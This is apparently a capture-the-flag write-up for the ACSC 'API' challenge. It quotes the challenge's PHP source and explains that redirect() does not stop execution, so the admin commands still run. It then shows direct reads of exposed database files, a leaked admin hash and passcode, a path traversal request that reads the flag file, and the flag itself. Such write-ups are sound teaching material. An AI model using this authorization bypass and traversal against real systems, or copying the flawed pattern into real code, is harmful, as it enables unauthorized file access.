<hr />

<h2>description: Logic error in user authentication</h2>

<h1>API</h1>

<h2>Description</h2>

<p>Easy and simple API</p>

<p><code>https://api.chal.acsc.asia</code></p>

<p>{% file src="../../.gitbook/assets/api.tar.gz_e8eeed86d26a37a1b233b7e8b0e7f0ac.gz" caption="Challenge Files" %}</p>

<h2>Solution</h2>

<p>Sample API request:</p>

<p><code>text
id=test&amp;pw=test&amp;c=i
</code></p>

<p>The <code>c</code> parameter is used to decide the first command - signin, signup or signout.</p>

<p><code>php
function main($acc){
    gen_user_db($acc);
    gen_pass_db();
    header("Content-Type: application/json");
    $user = new User($acc);
    $cmd = $_REQUEST['c'];
    usleep(500000);
    switch($cmd){
        case 'i':
            if (!$user-&gt;signin())
                echo "Wrong Username or Password.\n\n";
            break;
        case 'u':
            if ($user-&gt;signup())
                echo "Register Success!\n\n";
            else
                echo "Failed to join\n\n";
            break;
        case 'o':
            if ($user-&gt;signout())
                echo "Logout Success!\n\n";
            else
                echo "Failed to sign out..\n\n";
            break;
    }
    challenge($user);
}
</code></p>

<p>The user is checked for <code>is_admin()</code>, then the <code>c2</code> parameter is used to decide a second admin command. If <code>is_admin()</code> is false, then <code>redirect()</code> is called.</p>

<p><code>php
function challenge($obj){
    if ($obj-&gt;is_login()) {
        $admin = new Admin();
        if (!$admin-&gt;is_admin()) $admin-&gt;redirect('/api.php?#access denied');
        $cmd = $_REQUEST['c2'];
        if ($cmd) {
            switch($cmd){
                case "gu":
                    echo json_encode($admin-&gt;export_users());
                    break;
                case "gd":
                    echo json_encode($admin-&gt;export_db($_REQUEST['db']));
                    break;
                case "gp":
                    echo json_encode($admin-&gt;get_pass());
                    break;
                case "cf":
                    echo json_encode($admin-&gt;compare_flag($_REQUEST['flag']));
                    break;
            }
        }
    }
}
</code></p>

<p>However, <code>redirect()</code> does not actually terminate the PHP script. It simply prints some HTML output. The code execution continues, and the <code>c2</code> parameter is always processed.</p>

<p><code>php
public function redirect($url, $msg=''){
    $con = "&lt;script type='text/javascript'&gt;".PHP_EOL;
    if ($msg) $con .= "\talert('%s');".PHP_EOL;
    $con .= "\tlocation.href = '%s';".PHP_EOL;
    $con .= "&lt;/script&gt;".PHP_EOL;
    header("location: ".$url);
    if ($msg) printf($con, $msg, $url);
    else printf($con, $url);
}
</code></p>

<p>Now, we need the passcode in order to perform the admin functions. We can access <code>/lib/db/user.db</code> and <code>/lib/db/passcode.db</code> directly from the server.</p>

<p>The admin account is</p>

<p><code>text
Pang|c307cae832059f15e52cc5e6a26a2eb3ae7173e6|1
</code></p>

<p>The passcode is</p>

<p><code>text
:&lt;vNk
</code></p>

<p>The <code>export_db</code> function gets the contents of a file.</p>

<p><code>php
public function export_db($file){
    if ($this-&gt;is_pass_correct()) {
        $path = dirname(__FILE__).DIRECTORY_SEPARATOR;
        $path .= "db".DIRECTORY_SEPARATOR;
        $path .= $file;
        $data = file_get_contents($path);
        $data = explode(',', $data);
        $arr = [];
        for($i = 0; $i &lt; count($data); $i++){
            $arr[] = explode('|', $data[$i]);
        }
        return $arr;
    }else 
        return "The passcode does not equal with your input.";
}
</code></p>

<p><code>$file</code> is user-controlled, so we can simply do a path traversal to get the flag:</p>

<p>```http
POST /api.php HTTP/2
Host: api.chal.acsc.asia</p>

<p>...</p>

<p>id=Abcabcabc&amp;pw=Abcabcabc&amp;c=i&amp;c2=gd&amp;pas=:<vNk&amp;db=../../../../../flag
```</p>

<p><img src="../../.gitbook/assets/73640cbd692c41e9b92a125dbc749989.png" alt="" /></p>

<p>The flag is <code>ACSC{it_is_hard_to_name_a_flag...isn't_it?}</code>.</p>
